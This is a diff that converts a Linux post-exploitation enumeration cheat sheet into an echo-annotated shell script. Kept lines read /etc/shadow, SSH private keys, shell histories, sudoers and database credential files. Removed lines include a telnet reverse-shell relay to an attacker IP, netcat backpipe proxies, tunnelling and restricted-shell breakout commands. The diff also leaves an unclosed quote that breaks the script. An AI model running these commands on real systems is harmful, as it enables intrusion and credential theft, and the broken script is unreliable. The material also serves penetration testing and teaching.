@@ -59,52 +59,24 @@ cat /etc/cron.deny
 cat /etc/crontab
 cat /etc/anacrontab
 cat /var/spool/cron/crontabs/root
-Any plain text usernames and/or passwords?
-
-1
-2
-3
-4
+echo "Any plain text usernames and/or passwords?"
 grep -i user [filename]
 grep -i pass [filename]
 grep -C 5 "password" [filename]
 find . -name "*.php" -print0 | xargs -0 grep -i -n "var $password"   # Joomla
-Communications & Networking
-
-What NIC(s) does the system have? Is it connected to another network?
-
-1
-2
-3
+echo "[!] Communications & Networking"
+echo "What NIC(s) does the system have? Is it connected to another network?"
 /sbin/ifconfig -a
 cat /etc/network/interfaces
 cat /etc/sysconfig/network
-What are the network configuration settings? What can you find out about this network? DHCP server? DNS server? Gateway?
-
-1
-2
-3
-4
-5
-6
+echo "What are the network configuration settings? What can you find out about this network? DHCP server? DNS server? Gateway?"
 cat /etc/resolv.conf
 cat /etc/sysconfig/network
 cat /etc/networks
 iptables -L
 hostname
 dnsdomainname
-What other users & hosts are communicating with the system?
-
-1
-2
-3
-4
-5
-6
-7
-8
-9
-10
+echo "What other users & hosts are communicating with the system?"
 lsof -i
 lsof -i :80
 grep 80 /etc/services
@@ -115,75 +87,12 @@ chkconfig --list
 chkconfig --list | grep 3:on
 last
 w
-Whats cached? IP and/or MAC addresses
-
-1
-2
-3
+echo "Whats cached? IP and/or MAC addresses"
 arp -e
 route
 /sbin/route -nee
-Is packet sniffing possible? What can be seen? Listen to live traffic
-
-1
-tcpdump tcp dst 192.168.1.7 80 and tcp dst 10.5.5.252 21
-Note: tcpdump tcp dst [ip] [port] and tcp dst [ip] [port]
-
-Have you got a shell? Can you interact with the system?
-
-1
-2
-3
-nc -lvp 4444    # Attacker. Input (Commands)
-nc -lvp 4445    # Attacker. Ouput (Results)
-telnet [atackers ip] 44444 | /bin/sh | [local ip] 44445    # On the targets system. Use the attackers IP!
-Note: http://lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/
-
-Is port forwarding possible? Redirect and interact with traffic from another view
-
-Note: http://www.boutell.com/rinetd/
-
-Note: http://www.howtoforge.com/port-forwarding-with-rinetd-on-debian-etch
-
-Note: http://downloadcenter.mcafee.com/products/tools/foundstone/fpipe2_1.zip
-
-Note: FPipe.exe -l [local port] -r [remote port] -s [local port] [local IP]
-
-1
-FPipe.exe -l 80 -r 80 -s 80 192.168.1.7
-Note: ssh -[L/R] [local port]:[remote ip]:[remote port] [local user]@[local ip]
-
-1
-2
-ssh -L 8080:127.0.0.1:80 root@192.168.1.7    # Local Port
-ssh -R 8080:127.0.0.1:80 root@192.168.1.7    # Remote Port
-Note: mknod backpipe p ; nc -l -p [remote port] < backpipe | nc [local IP] [local port] >backpipe
-
-1
-2
-3
-mknod backpipe p ; nc -l -p 8080 < backpipe | nc 10.5.5.151 80 >backpipe    # Port Relay
-mknod backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc localhost 80 | tee -a outflow 1>backpipe    # Proxy (Port 80 to 8080)
-mknod backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc localhost 80 | tee -a outflow & 1>backpipe    # Proxy monitor (Port 80 to 8080)
-Is tunnelling possible? Send commands locally, remotely
-
-1
-2
-ssh -D 127.0.0.1:9050 -N [username]@[ip]
-proxychains ifconfig
-Confidential Information & Users
-
-Who are you? Who is logged in? Who has been logged in? Who else is there? Who can do what?
-
-1
-2
-3
-4
-5
-6
-7
-8
-9
+echo "[!] Confidential Information & Users"
+echo "Who are you? Who is logged in? Who has been logged in? Who else is there? Who can do what?"
 id
 who
 w
@@ -193,69 +102,30 @@ grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1}'   # List of super us
 awk -F: '($3 == "0") {print}' /etc/passwd   # List of super users
 cat /etc/sudoers
 sudo -l
-What sensitive files can be found?
-
-1
-2
-3
-4
+echo "What sensitive files can be found?"
 cat /etc/passwd
 cat /etc/group
 cat /etc/shadow
 ls -alh /var/mail/
-Anything "interesting" in the home directorie(s)? If it's possible to access
-
-1
-2
+echo "Anything 'interesting' in the home directorie(s)? If it's possible to access"
 ls -ahlR /root/
 ls -ahlR /home/
-Are there any passwords in; scripts, databases, configuration files or log files? Default paths and locations for passwords
-
-1
-2
-3
+echo "Are there any passwords in; scripts, databases, configuration files or log files? Default paths and locations for passwords"
 cat /var/apache2/config.inc
 cat /var/lib/mysql/mysql/user.MYD
 cat /root/anaconda-ks.cfg
-What has the user being doing? Is there any password in plain text? What have they been edting?
-
-1
-2
-3
-4
-5
+echo "What has the user being doing? Is there any password in plain text? What have they been edting?"
 cat ~/.bash_history
 cat ~/.nano_history
 cat ~/.atftp_history
 cat ~/.mysql_history
 cat ~/.php_history
-What user information can be found?
-
-1
-2
-3
-4
+echo "What user information can be found?"
 cat ~/.bashrc
 cat ~/.profile
 cat /var/mail/root
 cat /var/spool/mail/root
-Can private-key information be found?
-
-1
-2
-3
-4
-5
-6
-7
-8
-9
-10
-11
-12
-13
-14
-15
+echo "Can private-key information be found?"
 cat ~/.ssh/authorized_keys
 cat ~/.ssh/identity.pub
 cat ~/.ssh/identity
@@ -271,33 +141,15 @@ cat /etc/ssh/ssh_host_rsa_key.pub
 cat /etc/ssh/ssh_host_rsa_key
 cat /etc/ssh/ssh_host_key.pub
 cat /etc/ssh/ssh_host_key
-File Systems
-
-Which configuration files can be written in /etc/? Able to reconfigure a service?
-
-1
-2
-3
-4
-5
-6
-7
+echo "[!] File Systems"
+echo "Which configuration files can be written in /etc/? Able to reconfigure a service?"
 ls -aRl /etc/ | awk '$1 ~ /^.*w.*/' 2>/dev/null     # Anyone
 ls -aRl /etc/ | awk '$1 ~ /^..w/' 2>/dev/null       # Owner
 ls -aRl /etc/ | awk '$1 ~ /^.....w/' 2>/dev/null    # Group
 ls -aRl /etc/ | awk '$1 ~ /w.$/' 2>/dev/null        # Other
-
 find /etc/ -readable -type f 2>/dev/null               # Anyone
 find /etc/ -readable -type f -maxdepth 1 2>/dev/null   # Anyone
-What can be found in /var/ ?
-
-1
-2
-3
-4
-5
-6
-7
+echo "What can be found in /var/ ?"
 ls -alh /var/log
 ls -alh /var/mail
 ls -alh /var/spool
@@ -305,60 +157,13 @@ ls -alh /var/spool/lpd
 ls -alh /var/lib/pgsql
 ls -alh /var/lib/mysql
 cat /var/lib/dhcp3/dhclient.leases
-Any settings/files (hidden) on website? Any settings file with database information?
-
-1
-2
-3
-4
-5
+echo "Any settings/files (hidden) on website? Any settings file with database information?"
 ls -alhR /var/www/
 ls -alhR /srv/www/htdocs/
 ls -alhR /usr/local/www/apache22/data/
 ls -alhR /opt/lampp/htdocs/
 ls -alhR /var/www/html/
-Is there anything in the log file(s) (Could help with "Local File Includes"!)
-
-1
-2
-3
-4
-5
-6
-7
-8
-9
-10
-11
-12
-13
-14
-15
-16
-17
-18
-19
-20
-21
-22
-23
-24
-25
-26
-27
-28
-29
-30
-31
-32
-33
-34
-35
-36
-37
-38
-39
-40
+echo "Is there anything in the log file(s) (Could help with 'Local File Includes'!)"
 cat /etc/httpd/logs/access_log
 cat /etc/httpd/logs/access.log
 cat /etc/httpd/logs/error_log
@@ -397,19 +202,7 @@ ls -alh /var/lib/dhcp3/
 ls -alh /var/log/postgresql/
 ls -alh /var/log/proftpd/
 ls -alh /var/log/samba/
-
-Note: auth.log, boot, btmp, daemon.log, debug, dmesg, kern.log, mail.info, mail.log, mail.warn, messages, syslog, udev, wtmp
-Note: http://www.thegeekstuff.com/2011/08/linux-var-log-files/
-
-If commands are limited, you break out of the "jail" shell?
-
-1
-2
-3
-python -c 'import pty;pty.spawn("/bin/bash")'
-echo os.system('/bin/bash')
-/bin/sh -i
-How are file-systems mounted?
+echo "How are file-systems mounted?
 mount
 df -h
 echo "Are there any unmounted file-systems?"
